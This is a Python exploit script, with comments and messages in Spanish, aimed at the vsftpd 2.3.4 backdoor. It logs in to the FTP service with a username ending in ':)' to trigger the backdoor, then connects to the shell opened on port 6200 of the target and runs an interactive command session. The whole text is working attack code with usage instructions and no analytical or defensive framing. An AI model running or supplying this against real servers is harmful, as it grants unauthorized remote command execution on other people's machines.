#!/usr/bin/env python3

import sys
import socket
import threading
import time

def exploit(target_ip, target_port, shell_port):
    # Conectar al FTP y enviar el payload
    try:
        print(f"[i] Conectando a {target_ip}:{target_port}")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.connect((target_ip, target_port))
        banner = s.recv(1024).decode()
        print(f"[+] Banner: {banner.strip()}")

        # Enviar usuario con el backdoor (añade el smiley face ":)")
        s.send(b'USER admin:)\r\n')
        s.recv(1024)

        # Enviar cualquier contraseña
        s.send(b'PASS password\r\n')

        s.close()
        print("[+] Payload enviado. Intentando conectar a la shell remota...")
        time.sleep(4) # Dar tiempo al servidor para que abra la shell

        # Conectar a la shell remota en el puerto 6200 del objetivo
        remote_shell_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        remote_shell_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        remote_shell_sock.connect((target_ip, shell_port))
        print(f"[+] Conexión a la shell remota establecida en {target_ip}:{shell_port}")
        print(f"[i] Intentando entrar dentro del servidor. Escriba 'whoami' para comprobar el resultado")
        # Iniciar sesión interactiva
        interactive_shell(remote_shell_sock)

    except Exception as e:
        print(f"[-] Error al conectar o enviar el payload: {e}")

def interactive_shell(sock):
    # Hilo para recibir datos del socket y mostrarlos
    def reader(sock):
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                sys.stdout.write(data.decode())
                sys.stdout.flush()
            except:
                break

    threading.Thread(target=reader, args=(sock,), daemon=True).start()

    # Bucle principal para enviar comandos
    while True:
        try:
            cmd = input()
            sock.send(cmd.encode() + b'\n')
        except (KeyboardInterrupt, EOFError):
            print("\n[*] Saliendo...")
            break
        except Exception as e:
            print(f"[-] Error al enviar comando: {e}")
            break
    sock.close()

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print(f"Uso: {sys.argv[0]} <target_ip> <target_port>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    shell_port = 6200 # El puerto donde vsftpd 2.3.4 abre la shell

    exploit(target_ip, target_port, shell_port)

